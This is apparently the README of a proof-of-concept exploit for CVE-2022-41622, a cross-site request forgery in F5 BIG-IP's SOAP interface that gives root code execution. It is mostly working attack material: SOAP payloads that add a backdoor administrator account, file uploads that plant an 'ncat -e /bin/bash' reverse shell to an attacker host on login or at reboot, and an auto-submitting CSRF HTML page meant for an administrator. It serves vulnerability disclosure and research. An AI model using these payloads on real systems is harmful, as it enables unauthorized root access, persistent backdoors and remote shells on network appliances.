This is a proof of concept for CVE-2022-41622, which is a CSRF in F5 Big-IP that
leads to remote code execution. Using this is a bit finnicky, but I'll walk you
through my favourite usecases.

# The vulnerability

The core vulnerability is a cross-site request forgery in F5 Big-IP's SOAP
interface, which is accessed via `/iControl/iControlPortal.cgi`, which runs
as `root`. But despite being root, we're restricted by an SELinux policy, which
makes this difficult to exploit. We'll show some bypasses below, though.

The SOAP interface has no CSRF protection, which means an attacker can leverage
an authenticated user's session to perform any SOAP request supported. The full
list of WSDL files is included, and we've created payloads for some of the
important ones.

# Basic usage

The basic usage is:

```
ruby f5-soap-exploit.rb <target> <xml_template> [username:password]
```

The `username:password` is purely for testing - it takes a valid admin account
and sends the SOAP request directly to the server. This isn't an exploit or PoC
at all, it's simply using the endpoint as intended.

If you *don't* provide a `username:password`, it will print a CSRF payload.
To exploit the bug, an authenticated admin will have to visit a site containing
that payload. Their browser will be redirected and the action will happen in
the background.

Note that the actual payloads aren't pretty or hidden in any way - to exploit
this forreal, you'll probably have to put some effort in.

# Scenarios

We'll demonstrate these using an actual account, but remember that you can
exploit any of these using CSRF!

## Add a root user

This is probably the easiest one to exploit. It adds a user account with a
password, and you can use that password to log in via ssh. It's also noisy, of
course!

(The default password in the payload is `Password1`)

```
$ ruby ./f5-soap-exploit.rb 10.0.0.162 ./templates/add_user.xml admin:Password1
NOTE: You've provided a username and password, which means this is going
to authenticate, and therefore isn't an exploit

Don't enter a username:password if you want to generate a CSRF exploit!
Value for USERNAME [rontest]: mybackdoor
Value for FULLNAME [Ron Test]: My Backdoor
Value for CRYPTSHA512HASH [$6$T2mT4PeYSuyg/hSr$y/rN9tol5t1fRxTBqFVtxLzRfUBXt16yNahqYTaVVZa3PITfoAKBnuzqvwBT77qNBV4JjgwdhzqmsMk78bo6d0]:
Sending the following payload directly to 10.0.0.162...

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:user="urn:iControl:Management/UserManagement" xmlns:so
apenc="http://schemas.xmlsoap.org/soap/encoding/">
<soapenv:Header/>
<soapenv:Body>
<user:create_user_3 soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<users xsi:type="urn:Management.UserManagement.UserInfo3Sequence" soapenc:arrayType="urn:Management.UserManagement.UserInfo3[]" xmlns:urn="urn:iControl">

<item>
  <user>
    <name>mybackdoor</name>
    <full_name>My Backdoor</full_name>
  </user>

  <password>
    <is_encrypted>true</is_encrypted>
    <password>$6$T2mT4PeYSuyg/hSr$y/rN9tol5t1fRxTBqFVtxLzRfUBXt16yNahqYTaVVZa3PITfoAKBnuzqvwBT77qNBV4JjgwdhzqmsMk78bo6d0</password>
  </password>

  <permissions>
    <item>
      <role>USER_ROLE_ADMINISTRATOR</role>
      <partition>[All]</partition>
    </item>
  </permissions>

  <login_shell>/bin/bash</login_shell>
</item>
</users>
</user:create_user_3>
</soapenv:Body>
</soapenv:Envelope>

Response:
<E:Envelope
        xmlns:E="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:A="http://schemas.xmlsoap.org/soap/encoding/"
        xmlns:s="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:y="http://www.w3.org/2001/XMLSchema"
        xmlns:iControl="urn:iControl"
        E:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<E:Body>
<m:create_user_3Response
        xmlns:m="urn:iControl:Management/UserManagement"></m:create_user_3Response>
</E:Body>
</E:Envelope>

$ ssh mybackdoor@10.0.0.162
(mybackdoor@10.0.0.162) Password:
(mybackdoor@10.0.0.162) You are required to change your password immediately (root enforced)
[...]

[mybackdoor@localhost:NO LICENSE:Standalone] ~ # whoami
root
```

## Remote shell @ Login

We found a symlink in `/etc/profile.d` that's not covered by SELinux:

```
# ls -l /etc/profile.d/timeout.sh
lrwxrwxrwx. 1 root root 31 Jul 15 02:48 /etc/profile.d/timeout.sh -> ../../var/run/config/timeout.sh
```

`timeout.sh` can be replaced, and the next time a user logs in, any code in it
will run. Note that overwriting `timeout.sh` may cause problems, I have no idea
what it's supposed to do (it gets restored at reboot, though).

We will replace timeout.sh with the following - basically, restore the original
timeout.sh then pop a shell (you can also find it in the [examples/](/examples/)
folder):

```
# Restore the original file
echo 'IwojIFRISVMgSVMgQU4gQVVUTy1HRU5FUkFURUQgRklMRSAtIERPIE5PVCBFRElUISEhCiMKIyBVc2UgdGhlIHRtc2ggc2hlbGwgdXRpbGl0eSB0byBtYWtlIGNoYW5nZXMgdG8gdGhlIHN5c3RlbSBjb25maWd1cmF0aW9uLgojIEZvciBtb3JlIGluZm9ybWF0aW9uLCBzZWUgdG1zaCAtYSBoZWxwIHN5cyBzc2hkLgpQU09VVD1gL2Jpbi9wcyAtLW5vLWhlYWRlcnMgLW8gdHR5IC0kJGAKaWYgWyAiJHtQU09VVDowOjN9IiA9PSAidHR5IiBdOyB0aGVuCiAgICBleHBvcnQgVE1PVVQ9MAplbHNlCiAgICBleHBvcnQgVE1PVVQ9MApmaQoK' | base64 -d > /etc/profile.d/timeout.sh

# Pop a shell
ncat -e /bin/bash 10.0.0.179 4444
```

Here's the request / response:

```
$ base64 -w0 < examples/timeout.sh
IyBSZXN0b3JlIHRoZSBvcmlnaW5hbCBmaWxlCmVjaG8gJ0l3b2pJRlJJU1ZNZ1NWTWdRVTRnUVZWVVR5MUhSVTVGVWtGVVJVUWdSa2xNUlNBdElFUlBJRTVQVkNCRlJFbFVJU0VoQ2lNS0l5QlZjMlVnZEdobElIUnRjMmdnYzJobGJHd2dkWFJwYkdsMGVTQjBieUJ0WVd0bElHTm9ZVzVuWlhNZ2RHOGdkR2hsSUhONWMzUmxiU0JqYjI1bWFXZDFjbUYwYVc5dUxnb2pJRVp2Y2lCdGIzSmxJR2x1Wm05eWJXRjBhVzl1TENCelpXVWdkRzF6YUNBdFlTQm9aV3h3SUhONWN5QnpjMmhrTGdwUVUwOVZWRDFnTDJKcGJpOXdjeUF0TFc1dkxXaGxZV1JsY25NZ0xXOGdkSFI1SUMwa0pHQUthV1lnV3lBaUpIdFFVMDlWVkRvd09qTjlJaUE5UFNBaWRIUjVJaUJkT3lCMGFHVnVDaUFnSUNCbGVIQnZjblFnVkUxUFZWUTlNQXBsYkhObENpQWdJQ0JsZUhCdmNuUWdWRTFQVlZROU1BcG1hUW9LJyB8IGJhc2U2NCAtZCA+IC92YXIvcnVuL2NvbmZpZy90aW1lb3V0LnNoCgojIFBvcCBhIHNoZWxsCm5jYXQgLWUgL2Jpbi9iYXNoIDEwLjAuMC4xNzkgNDQ0NAo=

$ ruby ./f5-soap-exploit.rb 10.0.0.162 ./templates/upload_file.xml admin:Password1
NOTE: You've provided a username and password, which means this is going
to authenticate, and therefore isn't an exploit

Don't enter a username:password if you want to generate a CSRF exploit!
Value for FILENAME [/tmp/csrfdemo.txt]: /var/run/config/timeout.sh
Value for BASE64FILEDATA [SGVsbG8gd29ybGQh]: IyBSZXN0b3JlIHRoZSBvcmlnaW5hbCBmaWxlCmVjaG8gJ0l3b2pJRlJJU1ZNZ1NWTWdRVTRnUVZWVVR5MUhSVTVGVWtGVVJVUWdSa2xNUlNBdElFUlBJRTVQVkNCRlJFbFVJU0VoQ2lNS0l5QlZjMlVnZEdobElIUnRjMmdnYzJobGJHd2dkWFJwYkdsMGVTQjBieUJ0WVd0bElHTm9ZVzVuWlhNZ2RHOGdkR2hsSUhONWMzUmxiU0JqYjI1bWFXZDFjbUYwYVc5dUxnb2pJRVp2Y2lCdGIzSmxJR2x1Wm05eWJXRjBhVzl1TENCelpXVWdkRzF6YUNBdFlTQm9aV3h3SUhONWN5QnpjMmhrTGdwUVUwOVZWRDFnTDJKcGJpOXdjeUF0TFc1dkxXaGxZV1JsY25NZ0xXOGdkSFI1SUMwa0pHQUthV1lnV3lBaUpIdFFVMDlWVkRvd09qTjlJaUE5UFNBaWRIUjVJaUJkT3lCMGFHVnVDaUFnSUNCbGVIQnZjblFnVkUxUFZWUTlNQXBsYkhObENpQWdJQ0JsZUhCdmNuUWdWRTFQVlZROU1BcG1hUW9LJyB8IGJhc2U2NCAtZCA+IC92YXIvcnVuL2NvbmZpZy90aW1lb3V0LnNoCgojIFBvcCBhIHNoZWxsCm5jYXQgLWUgL2Jpbi9iYXNoIDEwLjAuMC4xNzkgNDQ0NAo=
Sending the following payload directly to 10.0.0.162...

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:con="urn:iControl:System/ConfigSync">
   <soapenv:Header/>
   <soapenv:Body>
      <con:upload_file soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <file_name xsi:type="xsd:string">/var/run/config/timeout.sh</file_name>
         <file_context xsi:type="urn:System.ConfigSync.FileTransferContext" xmlns:urn="urn:iControl">
            <!--type: Common.OctetSequence-->
            <file_data xsi:type="urn:Common.OctetSequence">IyBSZXN0b3JlIHRoZSBvcmlnaW5hbCBmaWxlCmVjaG8gJ0l3b2pJRlJJU1ZNZ1NWTWdRVTRnUVZWVVR5MUhSVTVGVWtGVVJVUWdSa2xNUlNBdElFUlBJRTVQVkNCRlJFbFVJU0VoQ2lNS0l5QlZjMlVnZEdobElIUnRjMmdnYzJobGJHd2dkWFJwYkdsMGVTQjBieUJ0WVd0bElHTm9ZVzVuWlhNZ2RHOGdkR2hsSUhONWMzUmxiU0JqYjI1bWFXZDFjbUYwYVc5dUxnb2pJRVp2Y2lCdGIzSmxJR2x1Wm05eWJXRjBhVzl1TENCelpXVWdkRzF6YUNBdFlTQm9aV3h3SUhONWN5QnpjMmhrTGdwUVUwOVZWRDFnTDJKcGJpOXdjeUF0TFc1dkxXaGxZV1JsY25NZ0xXOGdkSFI1SUMwa0pHQUthV1lnV3lBaUpIdFFVMDlWVkRvd09qTjlJaUE5UFNBaWRIUjVJaUJkT3lCMGFHVnVDaUFnSUNCbGVIQnZjblFnVkUxUFZWUTlNQXBsYkhObENpQWdJQ0JsZUhCdmNuUWdWRTFQVlZROU1BcG1hUW9LJyB8IGJhc2U2NCAtZCA+IC92YXIvcnVuL2NvbmZpZy90aW1lb3V0LnNoCgojIFBvcCBhIHNoZWxsCm5jYXQgLWUgL2Jpbi9iYXNoIDEwLjAuMC4xNzkgNDQ0NAo=</file_data>
            <chain_type xsi:type="urn:Common.FileChainType">FILE_FIRST_AND_LAST</chain_type>
         </file_context>
      </con:upload_file>
   </soapenv:Body>
</soapenv:Envelope>

Response:
<E:Envelope
        xmlns:E="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:A="http://schemas.xmlsoap.org/soap/encoding/"
        xmlns:s="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:y="http://www.w3.org/2001/XMLSchema"
        xmlns:iControl="urn:iControl"
        E:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<E:Body>
<m:upload_fileResponse
        xmlns:m="urn:iControl:System/ConfigSync"></m:upload_fileResponse>
</E:Body>
</E:Envelope>
```

Then we listen, wait for somebody to log in, then get a shell:

```
$ nc -v -l -p 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

[..... wait .....]

Ncat: Connection from 10.0.0.162.
Ncat: Connection from 10.0.0.162:38588.

whoami
root
```

## Remote shell @ Reboot

We found a shell-injection vulnerability in a tool called `f5_update_checker`
that runs as root (and with no SELinux restrictions) at reboot. If we create a
file, `/shared/f5_update_action` with a properly-formatted update file, and
a shell injection payload on line 2, it'll execute 2 minutes after the server's
next boot then get deleted.

This would make a great backdoor for persistence. :)

Here's an example (it's also in the [examples/](/examples/) folder):

```
AAA
https://localhost/success`ncat -e /bin/bash 10.0.0.179 4444`
https://localhost/error
0
0
0
0
```

Encode as base64, and upload it using the `upload_file.xml` template:

```
$ base64 -w0 < examples/f5_update_action
QUFBCmh0dHBzOi8vbG9jYWxob3N0L3N1Y2Nlc3NgbmNhdCAtZSAvYmluL2Jhc2ggMTAuMC4wLjE3OSA0NDQ0YApodHRwczovL2xvY2FsaG9zdC9lcnJvcgowCjAKMAowCg==

$ ruby ./f5-soap-exploit.rb 10.0.0.162 ./templates/upload_file.xml admin:Password1
NOTE: You've provided a username and password, which means this is going
to authenticate, and therefore isn't an exploit

Don't enter a username:password if you want to generate a CSRF exploit!
Value for FILENAME [/tmp/csrfdemo.txt]: /shared/f5_update_action
Value for BASE64FILEDATA [SGVsbG8gd29ybGQh]: QUFBCmh0dHBzOi8vbG9jYWxob3N0L3N1Y2Nlc3NgbmNhdCAtZSAvYmluL2Jhc2ggMTAuMC4wLjE3OSA0NDQ0YApodHRwczovL2xvY2FsaG9zdC9lcnJvcgowCjAKMAowCg==
Sending the following payload directly to 10.0.0.162...

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:con="urn:iControl:System/ConfigSync">
   <soapenv:Header/>
   <soapenv:Body>
      <con:upload_file soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <file_name xsi:type="xsd:string">/shared/f5_update_action</file_name>
         <file_context xsi:type="urn:System.ConfigSync.FileTransferContext" xmlns:urn="urn:iControl">
            <!--type: Common.OctetSequence-->
            <file_data xsi:type="urn:Common.OctetSequence">QUFBCmh0dHBzOi8vbG9jYWxob3N0L3N1Y2Nlc3NgbmNhdCAtZSAvYmluL2Jhc2ggMTAuMC4wLjE3OSA0NDQ0YApodHRwczovL2xvY2FsaG9zdC9lcnJvcgowCjAKMAowCg==</file_data>
            <chain_type xsi:type="urn:Common.FileChainType">FILE_FIRST_AND_LAST</chain_type>
         </file_context>
      </con:upload_file>
   </soapenv:Body>
</soapenv:Envelope>

Response:
<E:Envelope
        xmlns:E="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:A="http://schemas.xmlsoap.org/soap/encoding/"
        xmlns:s="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:y="http://www.w3.org/2001/XMLSchema"
        xmlns:iControl="urn:iControl"
        E:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<E:Body>
<m:upload_fileResponse
        xmlns:m="urn:iControl:System/ConfigSync"></m:upload_fileResponse>
</E:Body>
</E:Envelope>
```

Create a listener, then wait for a reboot:

```
ron@fedora ~ $ nc -v -l -p 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

[...... wait ......]

Ncat: Connection from 10.0.0.162.
Ncat: Connection from 10.0.0.162:55634.

whoami
root
```

You can tail `/var/log/f5_update_checker.out` after rebooting to make sure it
worked (obviously this only works if you already have access to the host):

```
# cat /var/log/f5_update_checker.out
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: EM callback utility started
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: Searching for EM callback file "/shared/f5_update_action"
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: EM callback file found -- parsing
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: EM callback file action: "AAA"
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: EM callback file success URL: "https://localhost/success`ncat -e /bin/bash 10.0.0.179 4444`"
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: EM callback file failure URL: "https://localhost/error"
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: EM callback file rebootOnSuccess flag: "8"
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: EM callback file rebootOnSuccess slot: "0"
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: EM callback file rebootOnFailure flag: "0"
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: EM callback file rebootOnFailure slot: "0"
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: Executing EM action: AAA
[Wed Oct 19 10:47:32 2022] f5em_callback [INFO]: Sleeping for 2 minutes before first attempt.
```

## Add User w/ CSRF

The previous examples show how to do run SOAP endpoints with an account, but 
obviously that's not really an exploit. Let's take a look at what a CSRF payload
looks like!

We'll use the same example of adding a user as above, but without an account:

```
$ ruby ./f5-soap-exploit.rb 10.0.0.162 ./templates/add_user.xml > examples/csrf-adduser-payload.html
Value for USERNAME [rontest]: csrfdemo2
Value for FULLNAME [Ron Test]: CSRF Demo
Value for CRYPTSHA512HASH [$6$T2mT4PeYSuyg/hSr$y/rN9tol5t1fRxTBqFVtxLzRfUBXt16yNahqYTaVVZa3PITfoAKBnuzqvwBT77qNBV4JjgwdhzqmsMk78bo6d0]: 

$ cat examples/csrf-adduser-payload.html

      <form id="form" method="post" action="https://10.0.0.162/iControl/iControlPortal.cgi" enctype="text/plain">
        <textarea id="payload" name="&lt;!--">--&gt;&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:user="urn:iControl:Management/UserManagement" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"&gt;
&lt;soapenv:Header/&gt;
&lt;soapenv:Body&gt;
&lt;user:create_user_3 soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
&lt;users xsi:type="urn:Management.UserManagement.UserInfo3Sequence" soapenc:arrayType="urn:Management.UserManagement.UserInfo3[]" xmlns:urn="urn:iControl"&gt;

&lt;item&gt;
  &lt;user&gt;
    &lt;name&gt;csrfdemo2&lt;/name&gt;
    &lt;full_name&gt;CSRF Demo&lt;/full_name&gt;
  &lt;/user&gt;

  &lt;password&gt;
    &lt;is_encrypted&gt;true&lt;/is_encrypted&gt;
    &lt;password&gt;$6$T2mT4PeYSuyg/hSr$y/rN9tol5t1fRxTBqFVtxLzRfUBXt16yNahqYTaVVZa3PITfoAKBnuzqvwBT77qNBV4JjgwdhzqmsMk78bo6d0&lt;/password&gt;
  &lt;/password&gt;

  &lt;permissions&gt;
    &lt;item&gt;
      &lt;role&gt;USER_ROLE_ADMINISTRATOR&lt;/role&gt;
      &lt;partition&gt;[All]&lt;/partition&gt;
    &lt;/item&gt;
  &lt;/permissions&gt;

  &lt;login_shell&gt;/bin/bash&lt;/login_shell&gt;
&lt;/item&gt;
&lt;/users&gt;
&lt;/user:create_user_3&gt;
&lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;
</textarea>
        <input type=submit>
      </form>

      <script>
        setTimeout(function() {
          document.getElementById("form").submit();
        }, 1000);
      </script>
```

Serve that HTML file somewhere, and send a link to an administrator. When the
administrator visits that link, their browser will redirect and access the
SOAP API using a typical CSRF payload.

```
$ python -m http.server -d examples/
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

[..... waiting .....]

127.0.0.1 - - [19/Oct/2022 11:07:57] "GET /csrf-adduser-payload.html HTTP/1.1" 200 -
127.0.0.1 - - [19/Oct/2022 11:07:58] code 404, message File not found
127.0.0.1 - - [19/Oct/2022 11:07:58] "GET /favicon.ico HTTP/1.1" 404 -
^C

$ ssh csrfdemo2@10.0.0.162
(csrfdemo2@10.0.0.162) Password: 
(csrfdemo2@10.0.0.162) You are required to change your password immediately (root enforced)
Changing password for csrfdemo2.
(current) BIG-IP password: 
(csrfdemo2@10.0.0.162) New BIG-IP password: 
(csrfdemo2@10.0.0.162) Retype new BIG-IP password: 
Last login: Wed Oct 19 11:00:43 2022 from 10.0.0.179
[csrfdemo2@localhost:NO LICENSE:Standalone] ~ # whoami
root
```

This obviously doesn't try to hide in any way - you can improve the CSRF payload
a great deal!
